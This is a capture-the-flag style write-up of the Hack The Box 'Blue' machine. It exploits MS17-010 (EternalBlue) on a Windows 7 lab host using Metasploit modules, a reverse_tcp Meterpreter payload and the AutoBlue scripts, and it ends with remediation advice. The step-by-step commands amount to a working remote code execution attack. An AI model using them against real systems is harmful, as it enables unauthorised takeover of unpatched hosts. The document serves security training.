# Hack The Box - Blue

| Property | Value |
|----------|-------|
| **Machine** | Blue |
| **Platform** | Hack The Box |
| **Difficulty** | Easy |
| **Target IP** | `10.10.10.40` |
| **Operating System** | Windows 7 Professional SP1 (7601) |

---

## Objective

Blue is an **easy Windows** machine that demonstrates exploitation of the **MS17-010 (EternalBlue)** SMB vulnerability. The objective is to identify the vulnerability, exploit it to gain remote code execution, and obtain **NT AUTHORITY\SYSTEM** privileges.

---

## Enumeration

### Nmap Scan

The target was scanned to identify open ports and running services.

<img width="1039" height="234" alt="image" src="https://github.com/user-attachments/assets/7f8bb564-29d5-44b2-a889-fb9f053bc822" />


| Port | State | Service | Version |
|------|------|---------|---------|
| 135 | Open | MSRPC | Microsoft Windows RPC |
| 139 | Open | NetBIOS | Microsoft Windows NetBIOS Session Service |
| 445 | Open | SMB | Windows 7 Professional SP1 |

### Analysis

The scan revealed that the target was running **Windows 7 Professional Service Pack 1** with SMB services exposed on ports **139** and **445**. Since Windows 7 SP1 is commonly associated with the **MS17-010 (EternalBlue)** vulnerability, further SMB enumeration was performed.

---

## Vulnerability Assessment

### MS17-010 Scanner

Launch Metasploit.

```text
msfconsole
```

Search for the MS17-010 modules.

```text
search ms17-010
```

Select the SMB scanner module.

```text
use auxiliary/scanner/smb/smb_ms17_010
```

<img width="396" height="42" alt="image" src="https://github.com/user-attachments/assets/32fa6dc1-d2ea-4241-91cc-db61bdb9bd07" />


Configure the target.

```text
set rhosts 10.10.10.40
```
<img width="1091" height="415" alt="image" src="https://github.com/user-attachments/assets/8b526067-aa96-45d4-9501-d3d85a4062ae" />


Run the scanner.

```text
run
```
<img width="1072" height="89" alt="image" src="https://github.com/user-attachments/assets/3dcba945-9334-4c32-bbc2-530ea469b9eb" />


### Result

The scanner reported that the target was **likely vulnerable to MS17-010**, confirming that exploitation was possible.

---

## Exploitation

### Metasploit EternalBlue Module

Select the EternalBlue exploit.

```text
use exploit/windows/smb/ms17_010_eternalblue
```

<img width="884" height="61" alt="image" src="https://github.com/user-attachments/assets/05b5b2cb-8227-496b-884c-78070a8716ee" />


Configure the target.

```text
set rhosts 10.10.10.40
```

View the available targets.

```text
show targets
```

Launch the exploit.

```text
run
```
<img width="546" height="29" alt="image" src="https://github.com/user-attachments/assets/f646e6b3-5f3f-4e4a-a4d5-fff818709d50" />


A shell session was successfully established.

<img width="1036" height="164" alt="image" src="https://github.com/user-attachments/assets/d36e8454-7529-4784-87d2-b222e41e4b83" />


The initial session was terminated to test an alternative payload.

---

### Meterpreter Payload

Configure a staged Meterpreter payload.

```text
set payload windows/x64/meterpreter/reverse_tcp
```

<img width="971" height="22" alt="image" src="https://github.com/user-attachments/assets/4ddca459-b426-4738-92e5-599fe2e8e0da" />


Run the exploit again.

A Meterpreter session was successfully obtained.

<img width="515" height="119" alt="image" src="https://github.com/user-attachments/assets/0cf9c7eb-ba60-4c2c-8ce4-184288427721" />


---

## AutoBlue Exploitation

To further validate the vulnerability, the **AutoBlue-MS17-010** exploit was used.

Clone the repository.

```text
git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
```

Run the vulnerability checker.

```text
python eternalblue_checker.py <Target-IP>
```
<img width="625" height="167" alt="image" src="https://github.com/user-attachments/assets/48018471-b838-4726-a456-1f733dbb618d" />


### Result

The checker confirmed that the target system was **not patched**, making it vulnerable to EternalBlue.

---

### Shellcode Generation

Navigate to the shellcode directory.

```text
cd shellcode
```

Generate the shellcode.

```text
./shell_prep.sh
```

<img width="655" height="384" alt="image" src="https://github.com/user-attachments/assets/d83e199c-8174-449d-8053-5717a8bf6682" />


Select the staged Meterpreter payload.

<img width="663" height="218" alt="image" src="https://github.com/user-attachments/assets/e0d58b3b-96c5-4bdc-9b1f-103c658ee197" />


---

### Listener Configuration

Generate the Metasploit listener.

```text
./listener_prep.sh
```

Configure the listener using the appropriate **LHOST** and **LPORT** values.

<img width="284" height="134" alt="image" src="https://github.com/user-attachments/assets/848f2a6a-d4b8-40ed-b264-16629617989a" />


The script automatically launches a Metasploit exploit handler.

<img width="549" height="32" alt="image" src="https://github.com/user-attachments/assets/d40d288b-6fba-48c5-9c0b-d316ca8af806" />


<img width="395" height="18" alt="image" src="https://github.com/user-attachments/assets/085ad84c-f211-4f5c-ae6d-9dda1cd561c9" />


---

### Execute the Exploit

From another terminal, execute the AutoBlue exploit.

```text
python eternalblue_exploit7.py 10.10.10.40 shellcode/sc_all.bin
```

Return to the Metasploit listener.

<img width="662" height="299" alt="image" src="https://github.com/user-attachments/assets/5b70e656-b17b-49e2-92c1-0bb657627355" />


A Meterpreter session was successfully established.

Interact with the active session.

<img width="510" height="262" alt="image" src="https://github.com/user-attachments/assets/aee44ee4-845f-4597-846c-6355a5e74616" />


---

## Privilege Level

The exploit provided direct access as:

```text
NT AUTHORITY\SYSTEM
```

This represents the highest privilege level available on a Windows system.

---

## Risk Analysis

### Finding: MS17-010 (EternalBlue)

**Severity:** Critical

**Risk**

The target is vulnerable to the **MS17-010 (EternalBlue)** SMB vulnerability, allowing unauthenticated remote code execution over SMB.

**Impact**

- Remote code execution
- Full SYSTEM-level access
- Credential theft
- Malware or ransomware deployment
- Lateral movement within the network
- Complete compromise of the host

**Remediation**

- Apply Microsoft's **MS17-010** security update.
- Disable SMBv1 where possible.
- Restrict SMB (TCP/445) using firewall rules.
- Keep Windows systems fully patched.
- Monitor SMB traffic for suspicious activity.
- Deploy Endpoint Detection and Response (EDR) solutions.

---

## Root Cause

The system was running an **unpatched Windows 7 Service Pack 1** installation that remained vulnerable to the **MS17-010 (EternalBlue)** SMB vulnerability. The SMB service was exposed on **TCP port 445**, allowing remote exploitation without authentication.

---

## Evidence

- Nmap identified SMB services on ports **139** and **445**.
- The Metasploit scanner confirmed the target was vulnerable to **MS17-010**.
- A Meterpreter session was successfully established.
- `getuid` confirmed **NT AUTHORITY\SYSTEM** privileges.

---

## Conclusion

The **Blue** machine was successfully compromised through the **MS17-010 (EternalBlue)** vulnerability. Exploiting the exposed SMB service on **TCP port 445** provided **remote code execution** and **NT AUTHORITY\SYSTEM** privileges without requiring valid credentials. This machine demonstrates the importance of timely security patching, disabling legacy protocols such as SMBv1, and restricting unnecessary network exposure to prevent critical remote code execution attacks.
